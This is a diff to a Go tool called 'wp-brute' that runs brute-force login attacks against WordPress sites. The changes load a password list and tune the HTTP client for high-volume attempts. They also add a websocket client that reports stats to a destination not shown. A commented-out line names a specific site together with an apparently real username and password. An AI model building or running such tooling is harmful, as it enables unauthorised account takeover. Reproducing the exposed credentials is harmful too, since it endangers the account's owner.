@@ -20,13 +20,15 @@ var credentialsChannel chan string
 // Entry point - sets up and coordinates the brute force attack
 func main() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
+	//init wait group
+	var wg sync.WaitGroup
+	wg.Add(1)
+	// start websocket client
+	go connectAndSendStats(&wg)
+	// writer
 	writer = uilive.New()
 	writer.Start()
 	defer writer.Stop()
-	go func() {
-		http.ListenAndServe("localhost:6060", nil)
-	}()
-	var wg sync.WaitGroup
 
 	if len(os.Args) != 3 {
 		fmt.Printf("Usage: wp-brute <credential_file> <Threads>\n")
@@ -40,6 +42,12 @@ func main() {
 	if err != nil {
 		fmt.Printf("Error converting string to int: %v", err)
 		return
+	}
+
+	xPasswords, err = ReadFile(passFile)
+	if err != nil {
+		fmt.Printf("Error reading password file: %v\n", err)
+		os.Exit(1)
 	}
 
 	credentials, err = readCredentials(crackedfile)
@@ -61,18 +69,14 @@ func main() {
 		}
 	}()
 
-	// Create a shared HTTP client for all workers
+	// Create a shared HTTP client with optimized settings
 	httpClient := &http.Client{
 		Timeout: 10 * time.Second,
 		Transport: &http.Transport{
-			MaxIdleConns:        0, // Match worker count
-			MaxIdleConnsPerHost: 0, // Keep per-host limit reasonable
-			MaxConnsPerHost:     0, // Add limit per host to prevent overwhelming
-			IdleConnTimeout:     90 * time.Second,
-			DisableKeepAlives:   false, // Ensure keep-alives are enabled
-			DisableCompression:  true,  // Disable compression for better performance
-			ForceAttemptHTTP2:   false, // Disable HTTP/2 for more consistent behavior
 
+			IdleConnTimeout:    10 * time.Second,
+			DisableCompression: true,
+			DisableKeepAlives:  true,
 		},
 	}
 
@@ -89,6 +93,10 @@ func main() {
 	close(credentialsChannel)
 
 	wg.Wait()
+
+	// err := connectToWordPress("https://spellforgesite.wordpress.com", "mahdiidrissi2022", "Sharky.gamer2020", httpClient)
+
+	// fmt.Print(err)
 }
 
 // Processes credentials from channel using shared HTTP client
